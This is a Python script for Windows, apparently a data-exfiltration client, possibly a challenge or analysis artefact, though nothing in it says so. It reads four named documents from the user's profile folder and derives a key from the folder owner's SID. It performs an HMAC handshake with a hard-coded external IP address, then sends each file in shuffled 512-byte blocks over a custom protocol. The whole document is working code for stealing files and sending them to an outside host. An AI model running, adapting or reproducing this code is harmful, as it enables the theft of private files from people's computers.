import hmac
import hashlib
import socket
from struct import pack
from random import shuffle
from time import sleep
import win32security
from sys import exit

p8 = lambda x : pack("!B", x)
p16 = lambda x : pack("!H", x)
p32 = lambda x : pack("!L", x)
p64 = lambda x : pack("!Q", x)


def g():
    return b''.join([p32(int(i)) for i in win32security.ConvertSidToStringSid(win32security.GetFileSecurity(
        ".", win32security.OWNER_SECURITY_INFORMATION
    ).GetSecurityDescriptorOwner()).split('-')[4:7]])

def k():
    return hashlib.md5(b''.join([p32(int(i)) for i in win32security.ConvertSidToStringSid(win32security.GetFileSecurity(
        ".", win32security.OWNER_SECURITY_INFORMATION
    ).GetSecurityDescriptorOwner()).split('-')[4:7]])).digest()

def sfdtb(data):
    bs = []
    off = 0
    while (off + 0x200) < len(data):
        bs.append( [ [off, 0x200], data[off:off + 0x200] ] )
        off += 0x200
    pad = len(data) - off
    if pad != 0:
        bs.append( [ [off, pad], data[off:off + pad] ] )    
    return bs

if __name__ == "__main__":

    import os
    targetFiles = ['Report_28.01.2021.pdf', "Docs.zip", "Specs.xlsx", "Report_29.01.2021.pdf"]
    desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Data')
    filesData = []

    for i in targetFiles:
        filesData.append(open(desktop + "\\" + i, 'rb').read())
        
    sock = socket.socket()
    sock.settimeout(5)
    try:
        sock.connect(("151.236.114.211", 17301))
    except socket.timeout:
        exit(-1)

    sock.send(b"\x4e\x46\x00\x00\x00\x0c" + g())

    sleep(0.2)
    sock.send(b"\x4e\x46\x01\x10")
    
    a = hmac.new(k(), 
        sock.recv(1024)[5:], hashlib.sha256).digest()

    sock.send(b"\x4e\x46\x01\x12\x00\x20" + a)
    sock.recv(1024)
    
    blocks = sfdtb(filesData[0])
    shuffle(blocks)

    sock.send(b"\x4e\x46\x06\x64" + b"9e5ea73b0e6fd93ce0ce17c8a1f220c5" + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p32(len(filesData[0])))

    for i in blocks:
        ps = 70 + i[0][1]
        sock.send(b"\x4e\x46\x06\x61" + p16(ps) + b"9e5ea73b0e6fd93ce0ce17c8a1f220c5" + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p32(i[0][0]) + p16(i[0][1]) + i[1])

        sock.recv(1024)

    blocks = sfdtb(filesData[1])
    shuffle(blocks)

    sock.send(b"\x4e\x46\x06\x64" + b"a8f6b206a5ae2b4235bc3159416c0e1d" + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p32(len(filesData[1])))

    for i in blocks:
        ps = 70 + i[0][1]
        sock.send(b"\x4e\x46\x06\x61" + p16(ps) + b"a8f6b206a5ae2b4235bc3159416c0e1d" + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p32(i[0][0]) + p16(i[0][1]) + i[1])

        sock.recv(1024)
    
    blocks = sfdtb(filesData[2])
    shuffle(blocks)

    sock.send(b"\x4e\x46\x06\x64" + b"e1a98adf40b890d9e4571f7b7b6cfd5c" + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p32(len(filesData[2])))

    for i in blocks:
        ps = 70 + i[0][1]
        sock.send(b"\x4e\x46\x06\x61" + p16(ps) + b"e1a98adf40b890d9e4571f7b7b6cfd5c" + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p32(i[0][0]) + p16(i[0][1]) + i[1])

        sock.recv(1024)

    blocks = sfdtb(filesData[3])
    shuffle(blocks)

    sock.send(b"\x4e\x46\x06\x64" + b"876b63b120e32e189c2856a9bc1c2844" + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p32(len(filesData[3])))

    for i in blocks:
        ps = 70 + i[0][1]
        sock.send(b"\x4e\x46\x06\x61" + p16(ps) + b"876b63b120e32e189c2856a9bc1c2844" + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p32(i[0][0]) + p16(i[0][1]) + i[1])

        sock.recv(1024)
    
    sleep(0.05)
    sock.send(b"\x4e\x46\x04\x40876b63b120e32e189c2856a9bc1c2844" + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
    
    sock.recv(1024)
